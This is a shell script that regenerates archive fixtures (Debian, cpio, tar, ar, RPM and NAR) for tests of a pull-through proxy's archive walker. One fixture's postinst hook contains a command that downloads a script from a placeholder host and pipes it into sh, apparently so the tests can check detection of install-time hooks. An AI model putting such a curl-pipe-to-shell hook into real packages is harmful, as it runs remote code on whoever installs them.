#!/bin/sh
# Regenerates the archive-format fixtures in the parent directory with the REAL
# packaging tools, so the walker is tested against what dpkg-deb, rpmbuild,
# cpio, ar, xz, zstd and nix-store actually write rather than against archives
# built by the same code that reads them.
#
# Needs: dpkg-deb, cpio, ar, tar, xz, zstd, lzma, bzip2, gzip and Docker (for the
# RPM fixtures, built with rpmbuild in fedora:latest, and the NAR fixtures,
# written by nix-store in nixos/nix:latest). The fixtures are committed; this
# script documents how they were made and is not run by the test suite.
#
# Produced with: dpkg-deb 1.22, GNU cpio 2.15, xz 5.6, zstd 1.5, RPM 6.0.2,
# Nix 2.35.
set -eu
here=$(cd "$(dirname "$0")" && pwd)
out=$(cd "$here/.." && pwd)
work=$(mktemp -d)
trap 'rm -rf "$work"' EXIT
cd "$work"

# --- the tree every tar/cpio/NAR fixture holds -----------------------------
mkdir -p src/hello/bin src/hello/share
printf '#!/bin/sh\necho hello from cpio\n' > src/hello/bin/hello
chmod 0755 src/hello/bin/hello
echo 'plain text file' > src/hello/share/README
ln -s ../share/README src/hello/bin/readme-link

# --- Debian package ---------------------------------------------------------
mkdir -p pkg/DEBIAN pkg/usr/bin pkg/etc/pthello
cat > pkg/DEBIAN/control <<'CTL'
Package: pthello
Version: 1.2.3-4
Architecture: all
Maintainer: Fixture <fixture@example.invalid>
Description: pullthrough test fixture
 Fixture package for the pull-through proxy archive walker tests.
CTL
printf '#!/bin/sh\nset -e\necho post-install-marker\ncurl -fsSL http://example.invalid/x | sh\n' > pkg/DEBIAN/postinst
printf '#!/bin/sh\nset -e\necho pre-install-marker\n' > pkg/DEBIAN/preinst
printf '#!/bin/sh\nset -e\necho pre-remove-marker\n' > pkg/DEBIAN/prerm
chmod 0755 pkg/DEBIAN/postinst pkg/DEBIAN/preinst pkg/DEBIAN/prerm
printf '/etc/pthello/config\n' > pkg/DEBIAN/conffiles
printf '#!/bin/sh\necho hello from pthello\n' > pkg/usr/bin/pthello
chmod 0755 pkg/usr/bin/pthello
echo 'key=value' > pkg/etc/pthello/config
ln -s pthello pkg/usr/bin/pthello-link
for z in xz gzip zstd none; do
  SOURCE_DATE_EPOCH=1700000000 dpkg-deb --root-owner-group -Z$z --build pkg "$out/pthello-$z.deb" >/dev/null
done

# --- cpio -------------------------------------------------------------------
(cd src && find hello | LC_ALL=C sort | cpio -o -H newc --quiet > "$out/hello-newc.cpio")
(cd src && find hello | LC_ALL=C sort | cpio -o -H odc --quiet > "$out/hello-odc.cpio")
(cd src && find hello | LC_ALL=C sort | cpio -o -H crc --quiet > "$out/hello-crc.cpio")
gzip -9n < "$out/hello-newc.cpio" > "$out/hello-newc.cpio.gz"

# --- tar under every compression ---------------------------------------------
(cd src && tar --sort=name --owner=0 --group=0 --numeric-owner --mtime=@1700000000 -cf ../hello.tar hello)
xz -6 -c hello.tar > "$out/hello.tar.xz"
xz -6 --check=sha256 -c hello.tar > "$out/hello-sha256.tar.xz"
xz -6 --check=none -c hello.tar > "$out/hello-nocheck.tar.xz"
xz --x86 --lzma2=preset=6 -c hello.tar > "$out/hello-bcj.tar.xz"
zstd -q -19 -c hello.tar > "$out/hello.tar.zst"
lzma -6 -c hello.tar > "$out/hello.tar.lzma"
bzip2 -9 -c hello.tar > "$out/hello.tar.bz2"
head -c 1536 hello.tar > part1
tail -c +1537 hello.tar > part2
{ xz -6 -c part1; xz -6 --block-size=512 -c part2; } > "$out/hello-multistream.tar.xz"
{ xz -6 -c part1; head -c 8 /dev/zero; xz -6 -c part2; } > "$out/hello-padded.tar.xz"

# --- a compressed single file ------------------------------------------------
printf '#!/bin/sh\necho single-file-marker\n' | gzip -9n > "$out/install.sh.gz"
printf '#!/bin/sh\necho single-file-marker\n' | xz -6 > "$out/install.sh.xz"

# --- plain ar with a GNU long name -------------------------------------------
echo 'short member' > short.txt
echo 'long member' > a-very-long-member-name-exceeding-sixteen.txt
ar rc "$out/plain.a" short.txt a-very-long-member-name-exceeding-sixteen.txt

# --- RPM (v4 format with every payload compressor, and the v6 format) --------
mkdir rpm
cat > build-rpm.sh <<'RPM'
#!/bin/sh
set -eu
dnf -y -q install rpm-build >/dev/null 2>&1
for p in w19.zstdio:zstd w6.xzdio:xz w9.gzdio:gzip w9.bzdio:bzip2 w6.lzdio:lzma w.ufdio:none; do
  rm -rf /root/rpmbuild
  rpmbuild -bb --quiet --define "_binary_payload ${p%%:*}" --define "_build_id_links none" /src/pthello.spec 2>/dev/null
  cp /root/rpmbuild/RPMS/noarch/pthello-1.2.3-4.noarch.rpm "/out/pthello-${p##*:}.rpm"
done
rm -rf /root/rpmbuild
rpmbuild -bb --quiet --define "_rpmformat 6" --define "_build_id_links none" /src/pthello.spec 2>/dev/null
cp /root/rpmbuild/RPMS/noarch/pthello-1.2.3-4.noarch.rpm /out/pthello-v6.rpm
chmod a+r /out/*.rpm
RPM
docker run --rm -v "$here":/src:ro -v "$work/build-rpm.sh":/build-rpm.sh:ro -v "$work/rpm":/out fedora:latest sh /build-rpm.sh
cp rpm/*.rpm "$out/"

# --- NAR ----------------------------------------------------------------------
mkdir nar
cat > build-nar.sh <<'NAR'
#!/bin/sh
set -eu
mkdir -p /tmp/t/hello/bin /tmp/t/hello/share/doc/deep/er
printf '#!/bin/sh\necho hello from nar\n' > /tmp/t/hello/bin/hello
chmod 0755 /tmp/t/hello/bin/hello
echo 'plain text file' > /tmp/t/hello/share/doc/README
echo 'nested' > /tmp/t/hello/share/doc/deep/er/file.txt
ln -s ../share/doc/README /tmp/t/hello/bin/readme-link
: > /tmp/t/hello/empty
nix-store --dump /tmp/t/hello > /out/hello.nar
printf 'just one file\n' > /tmp/t/single
nix-store --dump /tmp/t/single > /out/single.nar
chmod a+r /out/*
NAR
docker run --rm -v "$work/build-nar.sh":/build-nar.sh:ro -v "$work/nar":/out nixos/nix:latest sh /build-nar.sh
cp nar/*.nar "$out/"
xz -6 -c nar/hello.nar > "$out/hello.nar.xz"
zstd -q -19 -c nar/hello.nar > "$out/hello.nar.zst"
bzip2 -9 -c nar/hello.nar > "$out/hello.nar.bz2"
